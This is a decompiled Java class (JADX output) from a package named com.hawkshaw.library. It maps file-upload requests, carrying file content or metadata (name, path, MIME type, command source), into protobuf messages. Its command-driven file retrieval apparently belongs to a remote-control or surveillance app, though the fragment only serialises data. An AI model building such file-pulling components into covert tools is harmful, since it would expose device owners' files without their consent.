package com.hawkshaw.library.datalayer.network.service;

import W2.y;
import a3.e;
import b3.C0298a;
import w3.C1066b;
import w3.c;

public final class FileServiceImpl$uploadFile$$inlined$map$1 implements C1066b {
    final /* synthetic */ C1066b $this_unsafeTransform$inlined;

    public FileServiceImpl$uploadFile$$inlined$map$1(C1066b bVar) {
        this.$this_unsafeTransform$inlined = bVar;
    }

    public Object collect(final c cVar, e eVar) {
        Object collect = this.$this_unsafeTransform$inlined.collect(new c() {
            /* JADX WARNING: Removed duplicated region for block: B:12:0x0030  */
            /* JADX WARNING: Removed duplicated region for block: B:8:0x0021  */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public final java.lang.Object emit(java.lang.Object r8, a3.e r9) {
                /*
                    r7 = this;
                    boolean r0 = r9 instanceof com.hawkshaw.library.datalayer.network.service.FileServiceImpl$uploadFile$$inlined$map$1.AnonymousClass2.AnonymousClass1
                    if (r0 == 0) goto L_0x0013
                    r0 = r9
                    com.hawkshaw.library.datalayer.network.service.FileServiceImpl$uploadFile$$inlined$map$1$2$1 r0 = (com.hawkshaw.library.datalayer.network.service.FileServiceImpl$uploadFile$$inlined$map$1.AnonymousClass2.AnonymousClass1) r0
                    int r1 = r0.label
                    r2 = -2147483648(0xffffffff80000000, float:-0.0)
                    r3 = r1 & r2
                    if (r3 == 0) goto L_0x0013
                    int r1 = r1 - r2
                    r0.label = r1
                    goto L_0x0018
                L_0x0013:
                    com.hawkshaw.library.datalayer.network.service.FileServiceImpl$uploadFile$$inlined$map$1$2$1 r0 = new com.hawkshaw.library.datalayer.network.service.FileServiceImpl$uploadFile$$inlined$map$1$2$1
                    r0.<init>(r7, r9)
                L_0x0018:
                    java.lang.Object r9 = r0.result
                    b3.a r1 = b3.C0298a.f4140D
                    int r2 = r0.label
                    r3 = 1
                    if (r2 == 0) goto L_0x0030
                    if (r2 != r3) goto L_0x0028
                    Y1.C0110h.P(r9)
                    goto L_0x00b7
                L_0x0028:
                    java.lang.IllegalStateException r8 = new java.lang.IllegalStateException
                    java.lang.String r9 = "call to 'resume' before 'invoke' with coroutine"
                    r8.<init>(r9)
                    throw r8
                L_0x0030:
                    Y1.C0110h.P(r9)
                    w3.c r9 = r3
                    com.hawkshaw.library.datalayer.models.FileUploadRequest r8 = (com.hawkshaw.library.datalayer.models.FileUploadRequest) r8
                    com.hawkshaw.library.FileUploadRequest$Builder r2 = com.hawkshaw.library.FileUploadRequest.newBuilder()
                    com.hawkshaw.library.datalayer.models.FileUploadRequest$File r4 = r8.getFile()
                    if (r4 == 0) goto L_0x0063
                    com.hawkshaw.library.FileUploadRequest$File$Builder r4 = com.hawkshaw.library.FileUploadRequest.File.newBuilder()
                    com.hawkshaw.library.datalayer.models.FileUploadRequest$File r8 = r8.getFile()
                    byte[] r8 = r8.getContent()
                    com.google.protobuf.l r5 = com.google.protobuf.C0366m.f4803E
                    int r5 = r8.length
                    r6 = 0
                    com.google.protobuf.l r8 = com.google.protobuf.C0366m.j(r6, r8, r5)
                    com.hawkshaw.library.FileUploadRequest$File$Builder r8 = r4.setContent(r8)
                    com.google.protobuf.I r8 = r8.build()
                    com.hawkshaw.library.FileUploadRequest$File r8 = (com.hawkshaw.library.FileUploadRequest.File) r8
                    r2.setFile((com.hawkshaw.library.FileUploadRequest.File) r8)
                    goto L_0x00aa
                L_0x0063:
                    com.hawkshaw.library.datalayer.models.FileUploadRequest$MetaData r4 = r8.getMetadata()
                    if (r4 == 0) goto L_0x00aa
                    com.hawkshaw.library.FileUploadRequest$MetaData$Builder r4 = com.hawkshaw.library.FileUploadRequest.MetaData.newBuilder()
                    com.hawkshaw.library.datalayer.models.FileUploadRequest$MetaData r5 = r8.getMetadata()
                    java.lang.String r5 = r5.getName()
                    com.hawkshaw.library.FileUploadRequest$MetaData$Builder r4 = r4.setName(r5)
                    com.hawkshaw.library.datalayer.models.FileUploadRequest$MetaData r5 = r8.getMetadata()
                    java.lang.String r5 = r5.getPath()
                    com.hawkshaw.library.FileUploadRequest$MetaData$Builder r4 = r4.setPath(r5)
                    com.hawkshaw.library.datalayer.models.FileUploadRequest$MetaData r5 = r8.getMetadata()
                    java.lang.String r5 = r5.getMime()
                    com.hawkshaw.library.FileUploadRequest$MetaData$Builder r4 = r4.setMime(r5)
                    com.hawkshaw.library.datalayer.models.FileUploadRequest$MetaData r8 = r8.getMetadata()
                    com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r8 = r8.getSource()
                    com.hawkshaw.library.FileUploadRequest$MetaData$Source r8 = com.hawkshaw.library.datalayer.network.service.FileServiceKt.toSource(r8)
                    com.hawkshaw.library.FileUploadRequest$MetaData$Builder r8 = r4.setSource(r8)
                    com.google.protobuf.I r8 = r8.build()
                    com.hawkshaw.library.FileUploadRequest$MetaData r8 = (com.hawkshaw.library.FileUploadRequest.MetaData) r8
                    r2.setMetadata((com.hawkshaw.library.FileUploadRequest.MetaData) r8)
                L_0x00aa:
                    com.google.protobuf.I r8 = r2.build()
                    r0.label = r3
                    java.lang.Object r8 = r9.emit(r8, r0)
                    if (r8 != r1) goto L_0x00b7
                    return r1
                L_0x00b7:
                    W2.y r8 = W2.y.f2418a
                    return r8
                */
                throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.network.service.FileServiceImpl$uploadFile$$inlined$map$1.AnonymousClass2.emit(java.lang.Object, a3.e):java.lang.Object");
            }
        }, eVar);
        return collect == C0298a.f4140D ? collect : y.f2418a;
    }
}
